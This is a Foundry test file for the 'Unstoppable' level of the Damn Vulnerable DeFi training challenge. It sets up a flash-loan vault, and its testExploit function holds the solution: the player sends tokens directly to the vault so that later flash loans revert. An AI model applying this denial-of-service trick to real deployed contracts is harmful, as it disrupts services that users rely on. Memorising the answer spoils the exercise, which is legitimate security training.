// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "../Util.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../src/contracts/DamnValuableToken.sol";
import {UnstoppableVault} from "../../src/contracts/01-unstoppable/UnstoppableVault.sol";
import {ReceiverUnstoppable} from "../../src/contracts/01-unstoppable/ReceiverUnstoppable.sol";
import {ERC20} from "solmate/src/tokens/ERC4626.sol";


contract UnstoppableTest is Test {
    uint256 internal constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 internal constant INITIAL_PLAYER_TOKEN_BALANCE = 100e18;

    Util internal util;

    UnstoppableVault internal vault;
    ReceiverUnstoppable internal receiverContract;
    DamnValuableToken internal token;

    address payable internal deployer;
    address payable internal player;
    address payable internal someUser;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        util = new Util();
        address payable[] memory users = util.createUsers(3);
        deployer = users[0];
        player = users[1];
        someUser = users[2];
        vm.label(player, "Deployer");
        vm.label(player, "Player");
        vm.label(someUser, "User");

        token = new DamnValuableToken();
        vm.label(address(token), "DVT Token");

        vault = new UnstoppableVault(ERC20(token), deployer, deployer); // owner and fee recipient
        vm.label(address(vault), "Unstoppable Vault");

        //Send tokens to vault
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, address(deployer));

        //asserts
        assertEq(token.balanceOf(address(vault)),TOKENS_IN_VAULT);
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        assertEq(vault.maxFlashLoan(address(token)),TOKENS_IN_VAULT);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1e18), 0);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), 50_000e18);

        //Send tokens to player
        token.transfer(address(player), INITIAL_PLAYER_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);

        // Show it's possible for someUser to take out a flash loan
        vm.startPrank(someUser);
        receiverContract = new ReceiverUnstoppable(
            address(vault)
        );
        vm.label(address(receiverContract), "Receiver Unstoppable");
        receiverContract.executeFlashLoan(10);
        vm.stopPrank();
        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

     function testExploit() public{
        /** CODE YOUR SOLUTION HERE */
        vm.startPrank(player);
        token.transfer(address(vault), 10);
        vm.stopPrank();
        /* */
        vm.expectRevert();
        validation();
    }

    function validation() internal{
        vm.startPrank(someUser);
        receiverContract.executeFlashLoan(100e18);
        vm.stopPrank();
    }
}